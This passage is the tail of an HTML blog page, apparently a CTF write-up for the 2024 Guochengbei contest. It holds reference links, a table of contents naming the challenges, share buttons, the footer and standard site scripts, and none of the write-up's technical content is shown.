<li>[<a target="_blank" rel="noopener" href="https://z3r4y.blog.csdn.net/article/details/144701835]">https://z3r4y.blog.csdn.net/article/details/144701835]</a></li>
<li><a target="_blank" rel="noopener" href="https://jaspersec.top/2024/12/16/0x12%20%E5%9B%BD%E5%9F%8E%E6%9D%AF2024%20writeup%20with%20docker/">ä¸€äº›dockerå’Œé¢˜è§£</a></li>
</ol>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mountain"><span class="toc-number">1.</span> <span class="toc-text">Mountain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signal"><span class="toc-number">2.</span> <span class="toc-text">signal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#signal-env"><span class="toc-number">2.1.</span> <span class="toc-text">signal env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signal-%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">signal åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8-env"><span class="toc-number">3.1.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨ env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">å›¾ç‰‡æŸ¥çœ‹å™¨åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#n0ob-un4er"><span class="toc-number">4.</span> <span class="toc-text">n0ob_un4er</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-env"><span class="toc-number">4.1.</span> <span class="toc-text">n0ob_un4er env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">n0ob_un4er åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n0ob-un4er-%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text">n0ob_un4er å¤ç°</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-galllery"><span class="toc-number">5.</span> <span class="toc-text">ez_galllery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-galllery-env"><span class="toc-number">5.1.</span> <span class="toc-text">ez_galllery env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-galllery-%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">ez_galllery åˆ†æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">6.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">7.</span> <span class="toc-text">Ref</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&text=å›½åŸæ¯24"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&is_video=false&description=å›½åŸæ¯24"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=å›½åŸæ¯24&body=Check out this article: https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&title=å›½åŸæ¯24"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&name=å›½åŸæ¯24&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/&t=å›½åŸæ¯24"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    KC1zs4&#39;s Blog
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

  
<script src="/js/search.js"></script>

  <script type="text/javascript">
  $(function() {

    var $inputArea = $("input#search-input");
    var $resultArea = document.querySelector("div#search-result");

    $inputArea.focus(function() {
      var search_path = "search.xml";
      if (search_path.length == 0) {
        search_path = "search.xml";
      }
      var path = "/" + search_path;
      searchFunc(path, 'search-input', 'search-result');
    });

    $inputArea.keydown(function(e) {
      if (e.which == 13) {
        e.preventDefault();
      }
    });

    var observer = new MutationObserver(function(mutationsList, observer) {
      if (mutationsList.length == 1) {
        if (mutationsList[0].addedNodes.length) {
          $(".search-no-result").hide();
        } else if (mutationsList[0].removedNodes.length) {
          $(".search-no-result").show(200);
        }
      }
    });

    observer.observe($resultArea, { childList: true });

  });
  </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'kc1zs4-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
